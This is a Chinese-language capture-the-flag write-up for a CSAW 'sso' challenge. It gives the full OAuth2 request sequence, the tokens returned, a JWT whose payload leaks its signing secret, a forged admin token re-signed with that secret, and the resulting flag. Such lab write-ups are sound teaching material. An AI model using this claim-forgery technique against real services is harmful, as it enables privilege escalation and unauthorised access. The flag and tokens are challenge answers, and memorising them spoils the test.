# sso

這題是OAuth2的SSO

從註解可以看到:

`/oauth2/authorize` 和 `/oauth2/token`

另外還有 `/protected`

前兩個主要是用來做OAuth2 SSO的

後面那個可以推測是成功認證可以存取flag的頁面


翻一下OAuth2的標準

可以知道`/oauth2/authorize`要POST送的參數為:

`response_type=code&client_id=a&state=b&redirect_uri=http://web.chal.csaw.io:9000/protected`

送完之後，會拿到一段authorize code (在redirect後的網址上)

e.g. `code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiJhIiwicmVkaXJlY3RfdXJpIjoiaHR0cDovL3dlYi5jaGFsLmNzYXcuaW86OTAwMC9wcm90ZWN0ZWQiLCJ0eXBlIjoidXNlciIsImlhdCI6MTUzNzA4ODg4MiwiZXhwIjoxNTM3MDg5NDgyfQ.7dHJf84u7VZmxosk5SfWvbXmaOcOWZdfRMiXPq42fEA`

再把這段code塞到`/oauth2/token`要POST的參數上:

`grant_type=authorization_code&redirect_uri=http://web.chal.csaw.io:9000/protected&client_id=&code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiJhIiwicmVkaXJlY3RfdXJpIjoiaHR0cDovL3dlYi5jaGFsLmNzYXcuaW86OTAwMC9wcm90ZWN0ZWQiLCJ0eXBlIjoidXNlciIsImlhdCI6MTUzNzA4ODg4MiwiZXhwIjoxNTM3MDg5NDgyfQ.7dHJf84u7VZmxosk5SfWvbXmaOcOWZdfRMiXPq42fEA&state=b`

成功的話，會拿到Bearer token:

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzA4ODk5MCwiZXhwIjoxNTM3MDg5NTkwfQ.pSpNGukhnNXYG1PAVdBQh2ikEPAvA_RqoQukNSMB0GM`

這個token是JWT token

JWT Payload長這樣:

```
{
  "type": "user",
  "secret": "ufoundme!",
  "iat": 1537088990,
  "exp": 1537089590
}
```

他直接把secret給我們，然後那個type很明顯要我們改成`admin`

所以改完之後，重新生JWT的signature:

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzcwODg5OTAsImV4cCI6MTUzNzA4OTU5MH0.8dIKXYIIaXBMefhxvE5KRYIhac6HcrAXEWXNi1k7RJ4`

再來就把JWT token塞到header中後，去訪問`/protected`就能拿到flag:

`Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzcwODg5OTAsImV4cCI6MTUzNzA4OTU5MH0.8dIKXYIIaXBMefhxvE5KRYIhac6HcrAXEWXNi1k7RJ4`

`flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}`

